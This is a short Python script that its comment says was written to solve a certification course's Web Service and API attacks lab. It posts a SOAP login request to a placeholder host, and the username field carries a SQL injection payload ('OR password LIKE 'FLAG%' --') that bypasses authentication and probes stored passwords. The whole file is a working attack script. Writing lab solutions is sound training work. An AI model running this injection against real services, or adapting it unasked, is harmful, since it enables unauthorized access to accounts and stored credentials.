# a script I came up with to solve the Web Service and API attacks section for CBBH
import requests

username = "admin"
password = "admin"

print("Starting the request...") # debugging statement...

payload = f'''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>{username}' OR password LIKE 'FLAG%' -- </username><password>{password}</password></LoginRequest></soap:Body></soap:Envelope>'''
try:
   response = requests.post("http://IP:PORT/wsdl", data=payload, headers={"SOAPAction": '"Login"'}, timeout=5)
   print("Request Sent")
   print(response.status_code) # prints the response code for the POST request above
   print(response.text)

except requests.exceptions.Timeout:
    print("The request timed out.")
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")